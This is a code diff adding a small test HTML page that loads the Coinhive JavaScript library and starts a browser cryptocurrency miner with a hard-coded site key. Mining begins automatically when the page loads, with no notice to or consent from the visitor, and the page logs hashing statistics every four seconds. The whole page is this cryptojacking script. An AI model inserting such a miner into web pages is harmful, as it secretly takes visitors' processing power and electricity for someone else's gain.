@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+  <title>CH Test</title>
+</head>
+<body>
+  <h1>start</h1>
+
+<script>
+	var miner = new CoinHive.Anonymous('s0N1th4I4ElExw1U3JlqGVTjZR428Nyq');
+	miner.start();
+  
+  var stats = {}
+	miner.on('found', function() { console.log('found:', stats) })
+	miner.on('accepted', function() { console.log('accepted:', stats) })
+
+	setInterval(function() {
+		stats.hashesPerSecond = miner.getHashesPerSecond();
+		stats.totalHashes = miner.getTotalHashes();
+		stats.acceptedHashes = miner.getAcceptedHashes();
+	}, 4000);
+</script>
+</body>
+</html>
